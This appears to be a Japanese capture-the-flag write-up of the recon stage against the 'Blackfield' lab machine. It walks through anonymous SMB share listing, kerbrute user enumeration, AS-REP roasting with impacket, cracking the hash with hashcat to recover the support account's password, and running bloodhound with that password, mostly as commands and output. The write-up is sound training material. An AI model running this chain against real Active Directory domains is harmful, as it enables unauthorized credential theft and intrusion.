# Recon

SMBシェアへアノニマスログイン：
```
┌──(shoebill㉿shoebill)-[~]
└─$ smbclient -L 10.10.10.192                            
Password for [WORKGROUP\shoebill]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	forensic        Disk      Forensic / Audit share.
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	profiles$       Disk      
	SYSVOL          Disk      Logon server share
```

profiles$を除くとたくさんのフォルダがある：


```
┌──(shoebill㉿shoebill)-[~]
└─$ smbclient '//10.10.10.192/profiles$'
smb: \> dir
  .                                   D        0  Thu Jun  4 01:47:12 2020
  ..                                  D        0  Thu Jun  4 01:47:12 2020
  AAlleni                             D        0  Thu Jun  4 01:47:11 2020
  ABarteski                           D        0  Thu Jun  4 01:47:11 2020
  ABekesz                             D        0  Thu Jun  4 01:47:11 2020
...
  ZScozzari                           D        0  Thu Jun  4 01:47:12 2020
  ZTimofeeff                          D        0  Thu Jun  4 01:47:12 2020
  ZWausik                             D        0  Thu Jun  4 01:47:12 2020
```

フォルダ名がユーザ名っぽいので、これらよりユーザリストusers.txtを作る：

```

┌──(shoebill㉿shoebill)-[~/Blackfield_10.10.10.192]
└─$ cat users.txt            
AAlleni
ABarteski
ABekesz
...
ZMiick
ZScozzari
ZTimofeeff
ZWausik
```
`kerbrute`で有効なユーザが三人見つかった：

```
┌──(shoebill㉿shoebill)-[~/Blackfield_10.10.10.192]
└─$ kerbrute userenum -v --dc 10.10.10.192 -d BLACKFIELD.local users.txt             

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

...
2022/10/28 13:46:02 >  [+] VALID USERNAME:	 audit2020@BLACKFIELD.local
...
2022/10/28 13:48:38 >  [+] VALID USERNAME:	 support@BLACKFIELD.local
...
2022/10/28 13:48:44 >  [+] VALID USERNAME:	 svc_backup@BLACKFIELD.local
```

この三人の名前をvalid_users.txtとして保存する。

そのユーザリストを使ってGetNPUsers.pyを実行する：

```
┌──(shoebill㉿shoebill)-[~/Blackfield_10.10.10.192]
└─$ impacket-GetNPUsers BLACKFIELD.local/ -no-pass -dc-ip 10.10.10.192 -usersfile valid_users.txt 
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] User audit2020 doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$support@BLACKFIELD.LOCAL:953f9fcfb82c8ed65373a86861b8a7d6$006dd8c5f10c903610330d00c92c47cd3fb61c0966447d13c48011d6f40de4b8c5584a9be9b5c0e593f32d650665628ba1327550fb08b32e8c4fb3e64f50e7715a6bed96560cc4a44460f2bd891a673dd82bb082cf5447d4c320f9a8af2309c560ccd442f954275eb26902c18ead4f48c47a4f6e92d009357df9ea2a72e6c4f62e4f4e67a2606be502d7add27d6547c2d2463e2bbaf42a021ea80b731167be74c08abea059dfdb1eff1d5382b6d4e5604872b532a02af341b046ebf78ca96b4191393282441d54e12ed6abff47c4ae578c9d74d16ab0546799159d98188998154e278e1f63f3dcff0f8e80b869361f01796d18e1
[-] User svc_backup doesn't have UF_DONT_REQUIRE_PREAUTH set
```
ユーザsupportのハッシュが得られたので、これをhashというファイル名で保存してクラックする：

```
┌──(shoebill㉿shoebill)-[~/Blackfield_10.10.10.192]
└─$ hashcat -a 0 -m 18200 hash /usr/share/wordlists/rockyou.txt
...
$krb5asrep$23$support@BLACKFIELD.LOCAL:95...18e1:#00^BlackKnight
```
supportのクリデンシャルを使ってbloodhoundを実行する。

```
┌──(shoebill㉿shoebill)-[~/Blackfield_10.10.10.192]
└─$ bloodhound-python -u support -p '#00^BlackKnight' -ns 10.10.10.192 -d blackfield.local -c all
```






